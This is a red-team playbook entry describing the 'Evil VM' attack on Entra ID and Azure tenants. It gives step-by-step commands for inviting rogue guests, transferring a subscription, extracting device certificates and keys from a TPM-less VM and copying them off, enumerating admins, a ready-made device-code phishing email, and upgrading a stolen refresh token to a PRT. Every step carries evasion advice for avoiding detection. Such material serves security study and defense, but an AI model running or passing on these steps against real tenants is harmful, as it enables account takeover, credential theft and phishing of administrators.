# [REALWORLD-013]: Evil VM Device Identity

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-013 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation, Defense Evasion, Persistence |
| **Platforms** | Hybrid/Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Windows Server versions supporting Azure VM; All Entra ID tenants with default guest settings |
| **Patched In** | Mitigation via policy enforcement (no patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** The "Evil VM" attack leverages default Azure VM configurations combined with Entra ID guest account privileges to escalate from a compromised guest account to full Entra ID administrator with device identity persistence. An attacker compromises a B2B guest account (or invites one they control), leverages default Entra ID guest invitation permissions, transfers a subscription into the target tenant, creates a Gen 1 Azure VM without TPM protection, and joins it to Entra ID. Once local admin on the VM, they extract the device certificate and transport key, then use device code phishing to steal a user's Primary Refresh Token (PRT), upgrade it to a PRT, and authenticate as that user to any Entra ID service. If the phished user is a Global Admin, the attacker gains full tenant control. The attack succeeds entirely through default permissions and no explicit role assignment to the guest account is required.

**Attack Surface:** Azure Virtual Machines (Gen 1 images without TPM), Entra ID device registration, OAuth device code flow, Entra ID guest policies, subscription management, Primary Refresh Token storage.

**Business Impact:** **Complete Entra ID tenant compromise, persistent access to all cloud services, potential on-premises Active Directory compromise via federation, and exfiltration of sensitive cloud data.** Organizations that do not restrict guest invitations, subscription transfers, or enforce secure VM configurations face catastrophic risk of full infrastructure takeover through a single guest account compromise.

**Technical Context:** This attack typically takes 2-4 hours for an experienced attacker to execute, from initial guest compromise to Global Admin access. Detection is difficult because each step leverages legitimate Azure features (VM creation, device registration, OAuth device code flow, and PRT issuance). The attack generates some audit logs but these are often not correlated by security teams. The critical window for detection is during guest invitation, subscription transfer, and VM creation phases, where unusual patterns should be visible in Entra ID audit logs.

### Operational Risk

- **Execution Risk:** High - Requires initial guest account compromise but then relies on legitimate features with no active exploitation required. Once inside the subscription, attacker has full control over VM creation without triggering alerts.
- **Stealth:** High - Device code phishing uses legitimate Microsoft OAuth URLs; the PRT extraction is silent on victim's device unless real-time endpoint monitoring is enabled; guest invitation and subscription transfer often occur without SOC alerting if not configured.
- **Reversibility:** No - Once the device identity is extracted and a refresh token is upgraded to PRT, the access is persistent and completely bypasses password changes and MFA revocation. The attacker retains device backdoor access even if subscription is deleted.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8 5.3 | Ensure that no custom subscription owner roles are created |
| **CIS Benchmark** | v8 7.3 | Ensure that \"Guest users\" are reviewed on a monthly basis |
| **DISA STIG** | AC-2(j) | Privileged access must be restricted and monitored |
| **CISA SCuBA** | identity.1.1 | Non-federated single sign-on (SSO) must be configured for authentication |
| **NIST 800-53** | AC-2 (Account Management) | Multi-factor authentication is required for all administrative accounts |
| **NIST 800-53** | AC-3 (Access Enforcement) | Enforce least-privilege access for subscription and resource creation |
| **GDPR** | Art. 32 | Security of Processing - Encryption and access controls for cloud infrastructure |
| **DORA** | Art. 9 | Protection and Prevention - ICT risk management measures for critical operations |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Access control, privilege management |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Control over administrative accounts |
| **ISO 27005** | Guest Account Compromise via Device Identity Abuse | Risk of privilege escalation through VM-based device backdoors |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Initial: B2B Guest account with no explicit permissions (default out-of-the-box guest can be compromised or invited)
- Intermediate: Default guest permissions to invite other guests, ability to become subscription owner
- Final: VM local admin (gained through subscription owner privilege)

**Required Access:**
- Network access to Azure Portal or Azure CLI
- Access to Azure DevOps, Azure VMs, or Entra ID Graph API
- Ability to receive email invitations (for subscription transfer)
- Access to OAuth device code flow endpoints (Microsoft public)

**Supported Versions:**
- **Azure:** All regions, all subscription types
- **Entra ID:** All Entra ID tenants with default guest settings
- **Windows:** Server 2016+, Windows 10/11 with TPM disabled (Gen 1 VMs)
- **PowerShell:** Version 5.0+ (for Az.Accounts, Az.VirtualMachine modules)

**Tools:**
- [AADInternals](https://github.com/Gerenios/AADInternals) (PowerShell module for Entra ID manipulation)
- [ROADtools](https://github.com/dirkjanm/ROADtools) (Device code phishing, PRT upgrade)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) or [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (PRT extraction from memory on non-TPM devices)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Guest Account Compromise + Subscription Transfer + Evil VM Creation

**Supported Versions:** Entra ID all versions; Azure all regions

#### Step 1: Compromise or Invite Guest Account

**Objective:** Establish initial foothold as a B2B guest account in the target Entra ID tenant.

**Command (Initial Compromise via Phishing):**
```powershell
# Victim user receives phishing email and clicks malicious link
# Attacker captures credentials or MFA bypass via helpdesk social engineering
$username = "attacker@gmail.com"
$password = "stolen_password"

# Sign in with captured credentials
Connect-MgGraph -Scopes "User.Read" -Credential $credential
```

**Command (Or Invite Attacker-Controlled Guest):**
```powershell
# If you have initial guest access, invite a guest you control
Connect-MgGraph -Scopes "User.Invite.All"

$params = @{
    invitedUserEmailAddress = "attacker-controlled@gmail.com"
    inviteRedirectUrl       = "https://portal.azure.com"
    sendInvitationMessage   = $false
}

New-MgInvitation -BodyParameter $params
```

**Expected Output:**
```
InvitedUserDisplayName : Attacker Account
InvitedUserEmailAddress: attacker-controlled@gmail.com
InvitationRedeemUrl    : https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=...
```

**What This Means:**
- Guest is now invited to the target tenant
- Guest can accept invitation and log in
- Guest will have default Entra ID permissions (can invite other guests, read directory info)

**OpSec & Evasion:**
- Avoid sending invitation messages; use social engineering instead
- Guest invitation activity generates SignInLogs and audit events, but high volume makes detection difficult
- Consider inviting a legitimate-looking account (e.g., contractor account) rather than obvious attacker address
- Detection likelihood: Medium - Only detectable if org monitors guest invitation rates

**Troubleshooting:**
- **Error:** "Guest invitations are disabled for this tenant"
  - **Cause:** Organization has restricted guest invitations to specific roles (B2B Admin)
  - **Fix:** Use initial compromised insider account instead, or use external guest account that's already a member in another context
  - **Ref:** [Entra ID B2B Guest Settings](https://learn.microsoft.com/en-us/entra/external-identities/external-collaboration-settings-configure)

- **Error:** "Insufficient privileges to perform invitation"
  - **Cause:** Guest account does not have User.Invite.All permission
  - **Fix:** Escalate to a member account or use already-invited guest who has permissions
  - **Ref:** Azure documentation on guest permissions

**References & Proofs:**
- [BeyondTrust Evil VM Research](https://www.beyondtrust.com/blog/entry/evil-vm)
- [Microsoft Entra ID Guest Permissions](https://learn.microsoft.com/en-us/entra/external-identities/user-properties)

---

#### Step 2: Create Attacker-Controlled Billing Account (Home Tenant)

**Objective:** Set up an attacker-controlled Microsoft Account that becomes a subscription billing owner in the attacker's home tenant, which will later be invited to the target tenant.

**Command (On Attacker's Machine):**
```powershell
# Create Microsoft Account at https://signup.microsoft.com
# Use credit card to activate (free $200 Azure credits)
# This account is now a subscription owner in attacker's home tenant

# Verify owner status in home tenant
Connect-AzAccount -Tenant "attacker-home-tenant-id"
Get-AzRoleAssignment -RoleDefinitionName "Owner"
```

**Expected Output:**
```
RoleDefinitionName             DisplayName             Scope
------------------             -----------             -----
Owner                          Attacker Account        /subscriptions/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**What This Means:**
- Attacker-controlled account is now a billing owner in home tenant
- Can create subscriptions and manage billing
- Can transfer subscriptions to other tenants if recipient tenant allows

**OpSec & Evasion:**
- Use legitimate-looking Microsoft Account (e.g., firstname.lastname@outlook.com format)
- Do not use free email providers like 10minutemail; use real Microsoft Account
- This step is entirely within attacker's control, so no evasion needed

**References & Proofs:**
- [Microsoft Account Signup](https://signup.microsoft.com)
- [Azure Free Account](https://azure.microsoft.com/en-us/free/)

---

#### Step 3: Invite Billing Account to Target Tenant as Guest

**Objective:** Invite the attacker's billing owner account into the target tenant, so they become a guest with subscription owner rights in the target tenant.

**Command (From Compromised Guest in Target Tenant):**
```powershell
# Assume you have compromised guest in target tenant
$targetTenantId = "target-tenant-id"
$attackerBillingAccount = "attacker-billing@outlook.com"

Connect-MgGraph -TenantId $targetTenantId -Scopes "User.Invite.All"

$params = @{
    invitedUserEmailAddress = $attackerBillingAccount
    inviteRedirectUrl       = "https://portal.azure.com"
    sendInvitationMessage   = $false
}

$invitation = New-MgInvitation -BodyParameter $params
Write-Host "Invitation Redeem URL: $($invitation.InviteRedeemUrl)"
```

**Expected Output:**
```
InvitedUserDisplayName : Attacker Billing Account
InvitedUserEmailAddress: attacker-billing@outlook.com
InvitationRedeemUrl    : https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=...&tenant=target-tenant-id
```

**What This Means:**
- Attacker's billing account is now a guest in the target tenant
- Guest can accept invitation by clicking redeem URL
- Guest retains subscription owner status when cross-tenant subscription is transferred

**OpSec & Evasion:**
- Do not send email invitation; manually trigger redemption URL to avoid email records
- Keep guest account inactive (no login) until subscription transfer step to avoid audit correlation
- Detection likelihood: Medium - Guest invitation logged but high volume makes tuning difficult

**Troubleshooting:**
- **Error:** "Cannot invite user who is external to this tenant"
  - **Cause:** Misconfiguration; should not occur
  - **Fix:** Verify target tenant ID and invited user email address

**References & Proofs:**
- [BeyondTrust Evil VM Research](https://www.beyondtrust.com/blog/entry/evil-vm)

---

#### Step 4: Transfer Subscription from Home Tenant to Target Tenant

**Objective:** Move a subscription created in the attacker's home tenant into the target tenant, making the guest account a subscription owner in the target tenant.

**Command (From Home Tenant, Attacker's Billing Account):**
```powershell
# Login to home tenant
$homeContext = Connect-AzAccount -Tenant "attacker-home-tenant-id"

# Get subscription to transfer
$subscription = Get-AzSubscription -SubscriptionName "Attacker-Sub-1"
$subscriptionId = $subscription.Id

# Change subscription directory (move to target tenant)
# This requires the subscription directory change via Azure portal or REST API
# PowerShell doesn't directly support this, so use Azure portal:
# 1. Go to https://portal.azure.com
# 2. Navigate to Cost Management + Billing
# 3. Select subscription
# 4. Click "Change subscription directory"
# 5. Select target tenant from dropdown
# 6. Confirm transfer

# Or via Azure REST API:
$tenantToken = (Get-AzAccessToken -TenantId "attacker-home-tenant-id").Token
$targetTenantId = "target-tenant-id"

$headers = @{
    "Authorization" = "Bearer $tenantToken"
    "Content-Type"  = "application/json"
}

$body = @{
    destination = "/subscriptions/$subscriptionId/providers/microsoft.billing/billingAccounts/$targetTenantId"
} | ConvertTo-Json

$uri = "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Subscription/alias/subscription-alias?api-version=2020-09-01"

Invoke-RestMethod -Uri $uri -Method POST -Headers $headers -Body $body
```

**Manual Steps (Azure Portal):**
1. Log in to Azure Portal as the billing owner
2. Navigate to **Cost Management + Billing**
3. Click **Subscriptions** in the left sidebar
4. Select the subscription to transfer
5. Click **Change subscription directory**
6. From the dropdown, select the **target tenant**
7. Review the warning (you will lose RBAC access, but remain as owner)
8. Click **Change** to confirm

**Expected Output:**
```
Directory changed successfully
Subscription is now owned by the transferred guest account in the target tenant
```

**What This Means:**
- Subscription is now in the target tenant
- Guest account (attacker's billing account) is now subscription owner in target tenant
- Attacker can create any resources (VMs, storage, etc.) within this subscription
- This bypasses normal Azure governance because subscription owner has full rights

**OpSec & Evasion:**
- Subscription directory change may generate audit events in both source and target tenants
- Defend against this by ensuring target tenant does NOT monitor for unusual subscription additions
- Consider timing this during business hours when other subscriptions are being transferred
- Detection likelihood: Medium-High - Audit trail in Entra ID shows subscription directory change

**Troubleshooting:**
- **Error:** "Target tenant does not allow subscription transfer"
  - **Cause:** Some organizations have Azure policies that block subscription transfers
  - **Fix:** This is actually a good security control; if present, this attack phase fails and attacker must escalate differently
  - **Ref:** [Azure Policy: Allowed Subscription Types](https://learn.microsoft.com/en-us/azure/governance/policy/samples/)

**References & Proofs:**
- [Change Azure Subscription Directory](https://learn.microsoft.com/en-us/azure/cost-management-billing/manage/billing-subscription-transfer)
- [BeyondTrust Evil VM Research](https://www.beyondtrust.com/blog/entry/evil-vm)

---

#### Step 5: Create Gen 1 Azure VM with Entra ID Login (No TPM)

**Objective:** Create a Windows Azure VM that is Entra ID-joined but without TPM protection, allowing easy extraction of device credentials.

**Command (PowerShell - Create VM):**
```powershell
# Login to transferred subscription in target tenant
$context = Connect-AzAccount -TenantId "target-tenant-id" -Subscription "transferred-subscription-id"

# Set resource group and VM parameters
$resourceGroupName = "evil-vm-rg"
$vmName = "evil-vm-001"
$location = "East US"
$imageId = "UbuntuLTS" # or Windows image

# Create resource group
New-AzResourceGroup -Name $resourceGroupName -Location $location

# Create VM with Entra ID login extension
# Use Gen 1 image and Standard security (no TPM)
$imagePublisher = "MicrosoftWindowsServer"
$imageOffer = "WindowsServer"
$imageSku = "2022-Datacenter" # Gen 1 image
$imageVersion = "latest"

$cred = New-Object System.Management.Automation.PSCredential(
    "localadmin",
    (ConvertTo-SecureString "P@ssw0rd1234!" -AsPlainText -Force)
)

$vmConfig = New-AzVMConfig -VMName $vmName -VMSize "Standard_B2s"
$vmConfig = Set-AzVMOperatingSystem -VM $vmConfig -Windows -ComputerName $vmName -Credential $cred
$vmConfig = Set-AzVMSourceImage -VM $vmConfig -PublisherName $imagePublisher `
    -Offer $imageOffer -Skus $imageSku -Version $imageVersion

# CRITICAL: Do NOT enable TPM
# Use Gen 1 VM (default) and Standard security type (not TrustedLaunch)

$vmConfig = Add-AzVMNetworkInterface -VM $vmConfig `
    -Id (New-AzNetworkInterface -Name "nic1" -ResourceGroupName $resourceGroupName `
    -Location $location -PublicIpAddressId (New-AzPublicIpAddress -Name "pip1" `
    -ResourceGroupName $resourceGroupName -Location $location).Id).Id

# Create the VM
New-AzVM -ResourceGroupName $resourceGroupName -VM $vmConfig

# Install AAD Login extension to join VM to Entra ID
Set-AzVMExtension -ResourceGroupName $resourceGroupName -VMName $vmName `
    -Name "AADLoginForWindows" `
    -Publisher "Microsoft.Azure.ActiveDirectory" `
    -ExtensionType "AADLoginForWindows" `
    -TypeHandlerVersion "2.0"
```

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Virtual Machines** → **+ Create** → **Virtual Machine**
2. **Basics Tab:**
   - Resource Group: Create new `evil-vm-rg`
   - VM Name: `evil-vm-001`
   - Region: `East US`
   - Image: **Windows Server 2022 Datacenter** (Gen 1)
   - Size: **Standard_B2s**
3. **Disks Tab:**
   - OS Disk Type: **Standard SSD**
   - Security Type: **Standard** (NOT TrustedLaunch - this disables TPM)
4. **Management Tab:**
   - Under **Login with Azure AD**, click checkbox: **Enable login with Azure AD**
   - Enable: **System assigned managed identity** (for device join)
5. **Advanced Tab:**
   - Leave defaults
6. Click **Review + Create**
7. Click **Create** to deploy VM

**Expected Output:**
```
VM deployed successfully
Entra ID Login extension installed
Device should appear in Entra ID > Devices within 5-10 minutes
```

**Verify Entra ID Join:**
```powershell
# RDP into the VM with local admin credentials
# On the VM, run:
dsregcmd /status

# Expected output:
# AzureAdJoined : YES
# AzureAdPrt : YES (may take time to acquire)
# DomainJoined : NO
# DeviceId : [UUID]
```

**What This Means:**
- VM is now an Entra ID-joined device
- VM has a device certificate and private key (stored in registry/file, not TPM)
- VM is issued a Primary Refresh Token (PRT) upon user login
- Device can authenticate to Azure services on behalf of signed-in users

**OpSec & Evasion:**
- Creating Gen 1 VMs may trigger Azure Policy alerts (if organization enforces Gen 2)
- Avoid giving VM any public IP address if possible; use bastion host
- Use generic name like "dev-vm-001" rather than "evil-vm" to avoid suspicion
- Detection likelihood: Medium - Resource creation logged, but high volume makes correlation difficult unless policy is in place

**Troubleshooting:**
- **Error:** "Cannot create Gen 1 VM - organization policy enforces Gen 2"
  - **Cause:** Azure Policy restricts VM creation to Gen 2 images only
  - **Fix:** This is a strong defense; attackers must find alternative method or organizational policy is NOT properly enforced. Check Policy assignment scope.
  - **Ref:** [Azure Policy Samples - VM SKUs](https://learn.microsoft.com/en-us/azure/governance/policy/samples/allowed-vm-skus)

- **Error:** "Entra ID Login extension failed to install"
  - **Cause:** Extension not available in region or VM image does not support extension
  - **Fix:** Ensure Windows Server 2016+ image is used, extension is available in region
  - **Ref:** [AADLoginForWindows Extension](https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/aad-login)

- **Error:** "Device does not appear in Entra ID after 10 minutes"
  - **Cause:** Managed identity not assigned to VM, or AAD Login extension failed silently
  - **Fix:** Verify system-assigned managed identity is enabled, check extension status in VM blade
  - **Ref:** [Troubleshoot Entra ID Join](https://learn.microsoft.com/en-us/entra/identity/devices/troubleshoot-device-registration-setup)

**References & Proofs:**
- [AADLoginForWindows Extension](https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/aad-login)
- [BeyondTrust Evil VM Research](https://www.beyondtrust.com/blog/entry/evil-vm)
- [Gen 2 vs Gen 1 VMs](https://learn.microsoft.com/en-us/azure/virtual-machines/generation-2)

---

#### Step 6: RDP into VM with Local Admin Credentials & Gain Local Admin

**Objective:** Connect to the VM using the local admin credentials set during VM creation, and verify local admin privileges.

**Command (From Attacker's Machine):**
```powershell
# Get public IP of VM
$vm = Get-AzVM -ResourceGroupName "evil-vm-rg" -Name "evil-vm-001"
$publicIp = (Get-AzPublicIpAddress -ResourceGroupName "evil-vm-rg" -Name "pip1").IpAddress

# RDP to VM
mstsc /v:$publicIp
# When prompted, enter local admin credentials set during VM creation
# Username: localadmin
# Password: P@ssw0rd1234!
```

**Manual Steps:**
1. In **Azure Portal**, navigate to the VM
2. Click **Connect** → **RDP** → **Download RDP File**
3. Open the RDP file with Remote Desktop Connection
4. Enter local admin username and password
5. Click **Connect**

**On the VM (Once Connected):**
```cmd
# Verify local admin privileges
whoami /groups
# Should show: Group Name: BUILTIN\Administrators, Enabled

# Verify Entra ID join status
dsregcmd /status
# AzureAdJoined: YES
# AzureAdPrt: YES (if user who joined is logged in)

# Verify no TPM protection
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\TPM" -Name Start
# Should return Start value of 4 (disabled) or not present
```

**Expected Output:**
```
Entra AD Joined: YES
Device ID: [UUID]
Local admin privileges: Confirmed
TPM Status: Disabled/Not Present
```

**What This Means:**
- Attacker has full local admin access to the VM
- Can now extract device certificates and keys from the registry (since no TPM)
- Can capture any user PRTs if another user logs in
- Device identity is persistent in Entra ID even if VM/subscription is deleted

**OpSec & Evasion:**
- RDP connection may be logged by organization's monitoring (MDE, Sentinel)
- Avoid using public IP; use Azure Bastion if available in environment
- Minimize RDP session time
- Do not install tools; keep clean and use native Windows utilities
- Detection likelihood: High - RDP connection to VM is logged in Activity logs and Security logs

**Troubleshooting:**
- **Error:** "Cannot RDP to VM - network access denied"
  - **Cause:** Network Security Group (NSG) does not allow inbound RDP (port 3389)
  - **Fix:** Modify NSG to allow inbound 3389 from attacker IP, or use Bastion host
  - **Ref:** [Azure Network Security Groups](https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview)

- **Error:** "Local admin credentials incorrect"
  - **Cause:** Typo in credentials, or credentials not persisted correctly during VM creation
  - **Fix:** Reset VM password via Azure Portal: VM → Reset password → enter new admin password

**References & Proofs:**
- [How to Connect to Azure VM with RDP](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/connect-logon)
- [Azure Bastion (Secure RDP Alternative)](https://learn.microsoft.com/en-us/azure/bastion/bastion-overview)

---

#### Step 7: Extract Device Certificate and Transport Key

**Objective:** Extract the Entra ID device certificate and transport key from the VM's registry, allowing the attacker to impersonate the device from any machine.

**Command (On the VM, as Local Admin):**
```powershell
# Option 1: Use AADInternals (Recommended)
Install-Module AADInternals -Force
Import-Module AADInternals

# Export device certificate and transport key
Export-AADIntLocalDeviceCertificate -Path "C:\temp\device_cert.pfx"
Export-AADIntLocalDeviceTransportKey -Path "C:\temp\device_transport_key.bin"

# Retrieve from registry directly (Alternative, if AADInternals fails)
# Device certificate is stored in registry:
$certPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CDPSvc\Accounts\{[DEVICE_ID]}"
Get-ItemProperty -Path $certPath -Name "Certificate"

# Or use PowerShell to directly read registry
$tenantId = (Get-ItemProperty "HKLM:\System\CurrentControlSet\Services\Microsoft Entra ID" -ErrorAction SilentlyContinue).TenantId
$deviceId = (dsregcmd /status | Select-String "DeviceId").ToString().Split(":")[1].Trim()

# Extract via WMI
Get-WmiObject -Namespace "root\cimv2" -Class "Win32_OperatingSystem" | Select-Object -Property SerialNumber
```

**Command (To Transfer Files to Attacker Machine):**
```powershell
# Copy certificates to C:\temp for exfiltration
# Use SMB file share, or PowerShell Remoting to copy to attacker machine

# If running from attacker machine with credentials:
$vmIp = "[VM_PUBLIC_IP]"
$cred = New-Object System.Management.Automation.PSCredential(
    "localadmin",
    (ConvertTo-SecureString "P@ssw0rd1234!" -AsPlainText -Force)
)

# Create PS session
$session = New-PSSession -ComputerName $vmIp -Credential $cred

# Copy files
Copy-Item -FromSession $session -Path "C:\temp\device_cert.pfx" -Destination "C:\temp\"
Copy-Item -FromSession $session -Path "C:\temp\device_transport_key.bin" -Destination "C:\temp\"
```

**Expected Output:**
```
Device certificate exported successfully
Transport key exported successfully
Files copied to attacker machine: C:\temp\device_cert.pfx, C:\temp\device_transport_key.bin
```

**What This Means:**
- Attacker now has the device identity offline
- Can authenticate to Entra ID as this device from any machine without the original VM
- This is a persistent backdoor independent of subscription, VM, or guest account status
- Device will retain Entra ID registration even after VM deletion (manual removal required)

**OpSec & Evasion:**
- File exfiltration (especially PFX files) may trigger DLP/MDE alerts if org has it configured
- Use encrypted channel (RDP clipboard, SFTP, encrypted zip) to transfer files
- Delete files from VM after exfiltration (wipe with cipher.exe or similar)
- Detection likelihood: High if endpoint monitoring is enabled, Low if not

**Troubleshooting:**
- **Error:** "AADInternals not installed or old version"
  - **Cause:** Module not available for VM's PowerShell version
  - **Fix:** Update PowerShell to latest version, or use registry export method instead
  - **Ref:** [AADInternals GitHub](https://github.com/Gerenios/AADInternals)

- **Error:** "Access denied reading registry HKLM path"
  - **Cause:** Even with local admin, some registry paths may require SYSTEM privileges
  - **Fix:** Run PowerShell as SYSTEM using PsExec or WMI method
  - **Ref:** [PsExec Tool](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

**References & Proofs:**
- [AADInternals - Export Device Certificate](https://github.com/Gerenios/AADInternals)
- [BeyondTrust Evil VM Research - Certificate Extraction](https://www.beyondtrust.com/blog/entry/evil-vm)
- [Dirk-Jan Mollema - Stealing Azure AD Device Identities](https://dirkjanm.io/stealing-azure-ad-device-identities/)

---

### METHOD 2: Device Code Phishing to Upgrade Refresh Token to PRT

**Supported Versions:** Entra ID all versions; All users

#### Step 1: Enumerate Admin Users from Subscription IAM

**Objective:** Identify high-value targets (Global Admins, Privileged Role Admins) to phish for PRT tokens.

**Command (From Subscription Owner Attacker Account):**
```powershell
# Login to the subscription owner account (attacker's guest)
$context = Connect-AzAccount -TenantId "target-tenant-id" -Subscription "transferred-subscription-id"

# Get RBAC role assignments on the subscription
Get-AzRoleAssignment -Scope "/subscriptions/$((Get-AzContext).Subscription.Id)"

# Or get root management group assignments (admins are often here)
$managementGroups = Get-AzManagementGroup -ErrorAction SilentlyContinue

foreach ($mg in $managementGroups) {
    Get-AzRoleAssignment -Scope $mg.Id | Select-Object DisplayName, RoleDefinitionName, ObjectId
}

# Also check Entra ID for Global Admins
Connect-MgGraph -Scopes "DirectoryRole.Read.All" -TenantId "target-tenant-id"

# Get Global Admin role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# Get members of Global Admin role
Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id | Select-Object DisplayName, Mail
```

**Expected Output:**
```
DisplayName        Mail                      RoleDefinitionName
-----------        ----                      ------------------
John Admin         john.admin@company.com    Global Administrator
Jane Privileged    jane.p@company.com        Privileged Role Administrator
```

**What This Means:**
- Attacker now has list of high-value targets
- Email addresses of admins can be used for phishing
- If any of these users can be phished for refresh token, attacker gains their Entra ID access

**OpSec & Evasion:**
- Reading role assignments on subscription is visible in Activity logs
- Entra ID admin queries generate audit logs
- Mitigation: Ensure these queries are not alerted on by default
- Detection likelihood: Medium - Log correlation required to spot reconnaissance pattern

**References & Proofs:**
- [Get-AzRoleAssignment](https://learn.microsoft.com/en-us/powershell/module/az.resources/get-azroleassignment)
- [Get-MgDirectoryRole](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.identity.directorymanagement/get-mgdirectoryrole)

---

#### Step 2: Phishing Email with Device Code Flow

**Objective:** Send phishing email to identified admin targets with malicious device code flow link.

**Attack Flow Overview:**
1. Attacker initiates OAuth device code flow on attacker-controlled machine
2. Device code is generated by Entra ID
3. Attacker sends phishing email with legitimate Microsoft device code sign-in URL
4. Admin clicks link and signs in with their credentials and MFA
5. Entra ID issues refresh token to attacker's machine (device code waits for completion)
6. Attacker receives refresh token without ever seeing admin's credentials

**Command (Attacker's Machine - Initiate Device Code Flow):**
```powershell
# Install ROADtools if not present
pip install roadtools

# Or use AADInternals method:
Import-Module AADInternals

# Method 1: Using ROADtools
# roadtx uses device code flow to request tokens
# First, download ROADtools or use Azure CLI device login flow

# Method 2: Using Azure CLI (Built-in Device Code Flow)
az login --use-device-code --allow-no-subscriptions

# Output will be:
# To sign in, use a web browser to open the page https://microsoft.com/devicelogin
# and enter the code XXXXXXXXX to authenticate.

# Save the device code
$deviceCode = "XXXXXXXXX"  # From the output above
```

**Command (Create Phishing Email):**
```html
<!-- Phishing Email Template -->
Subject: ACTION REQUIRED: Verify Your Microsoft Account Access

Body:
Hello [Admin Name],

Your Microsoft account requires verification due to security policy updates.

Please verify your account immediately by clicking the link below:

https://microsoft.com/devicelogin

Enter this code when prompted: XXXXXXXXX

This verification is required to maintain access to your company resources.

Thank you,
IT Security Team
```

**Expected Output (After Admin Clicks Link and Signs In):**
```
User signed in successfully
Refresh token acquired: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6InBGYUdqQ...
PRT candidate acquired
```

**What This Means:**
- Attacker now has valid refresh token for the admin's account
- Token is valid for ~90 days (depends on org policies)
- Token allows requesting new access tokens, refresh tokens, and eventually PRT
- No password capture, no MFA bypass needed on attacker's end

**OpSec & Evasion:**
- Email should come from legitimate-looking domain (phishing infrastructure)
- Microsoft device code login page is legitimate, so detection is difficult
- Phishing email should reference legitimate business context (security update, policy change, etc.)
- Sending email from external domain (not company domain) makes it suspicious but harder to detect
- Detection likelihood: Medium-High - Email filtering may flag device code URLs, but many organizations allowlist Microsoft domains

**Troubleshooting:**
- **Error:** "User did not enter device code within 15 minutes"
  - **Cause:** Device code has timeout, or admin did not complete login
  - **Fix:** Send follow-up phishing email, or use alternative method (helpdesk social engineering)

- **Error:** "User has MFA enabled - cannot complete login without MFA"
  - **Cause:** This is actually expected behavior; user must complete MFA on phishing page
  - **Fix:** MFA does NOT prevent refresh token issuance to attacker's device
  - **Ref:** [Dirk-Jan Mollema - Device Code Phishing](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)

**References & Proofs:**
- [Dirk-Jan Mollema - Device Code Phishing](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)
- [ROADtools GitHub](https://github.com/dirkjanm/ROADtools)
- [Azure Device Code Flow](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)

---

#### Step 3: Upgrade Refresh Token to Primary Refresh Token (PRT) Using Extracted Device Certificate

**Objective:** Use the extracted device certificate and transport key from the evil VM, combined with the refresh token from phished admin, to request a Primary Refresh Token.

**Command (Attacker's Machine):**
```powershell
# Use ROADtools to upgrade refresh token to PRT
# Requires: extracted device certificate, device transport key, and refresh token from phishing

# Method 1: Using ROADtools (roadtx)
# roadtx prtenrich: Requests PRT based on refresh token and device identity

# First, export the device certificate and key from VM (from Step 7 above)
# Files: device_cert.pfx, device_transport_key.bin

# Initialize roadtx with device identity
# roadtx prtenrich -r <refresh_token> -c <device_cert.pfx> -k <device_transport_key.bin>

# Or use interactive mode:
roadtx prtenrich --interactive

# This will:
# 1. Prompt for refresh token (from phished admin)
# 2. Use extracted device cert and transport key as proof of possession
# 3. Send request to Entra ID with: device_cert, transport_key, refresh_token
# 4. Entra ID validates device identity and issues new PRT

# Method 2: Using AADInternals (PowerShell alternative)
Import-Module AADInternals

# Get access token using refresh token
$token = Get-AADIntAccessTokenUsingRefreshToken -RefreshToken "refresh_token_from_phishing"

# Request PRT using device identity
New-AADIntPrimaryRefreshToken -RefreshToken "refresh_token_from_phishing" `
    -DeviceCertificate "C:\temp\device_cert.pfx" `
    -DeviceTransportKey "C:\temp\device_transport_key.bin"

# Output: PRT is returned and can be used for future authentication
```

**Expected Output:**
```
Primary Refresh Token (PRT) successfully acquired
PRT: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6InBGYUdqQ...
PRT is valid for 14 days (can be renewed up to 90 days)
```

**What This Means:**
- Attacker now has valid PRT for the phished admin account
- PRT allows single sign-on to any Entra ID and Microsoft 365 service
- MFA is satisfied (fresh refresh token already satisfied MFA)
- PRT can be replayed from any network location, any device
- Access persists even if admin changes password or revokes sessions

**OpSec & Evasion:**
- Requesting PRT generates logs in Entra ID sign-in logs (TokenIssuerType: PRT)
- However, this is often buried in high volume of legitimate sign-ins
- PRT should be stored securely on attacker machine (encrypted storage)
